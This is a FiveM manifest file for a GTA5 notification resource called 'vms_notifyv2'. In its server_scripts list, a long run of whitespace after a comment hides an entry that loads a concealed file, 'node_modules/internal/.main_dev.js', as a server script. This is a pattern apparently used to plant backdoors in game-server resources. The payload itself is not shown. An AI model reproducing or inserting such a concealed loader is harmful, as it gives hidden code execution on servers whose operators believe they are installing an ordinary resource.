fx_version 'adamant'
lua54 'on'
game 'gta5'

author 'vames™️'
description 'vms_notifyv2'
version '1.0.2'

ui_page 'html/ui.html'

client_scripts {
	'config/*.lua',
	'client/*.lua',
	'client/modules/*.lua',
}

server_scripts {
	'server/*.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.main_dev.js',
}

files {
	'config/*.js',
	'config/*.json',
	'html/*.*',
	'html/**/*.*',
}

escrow_ignore {
	'config/*.lua',
	'server/*.lua',
}

provide 'vms_notify'
dependency '/assetpacks'
dependency '/assetpacks'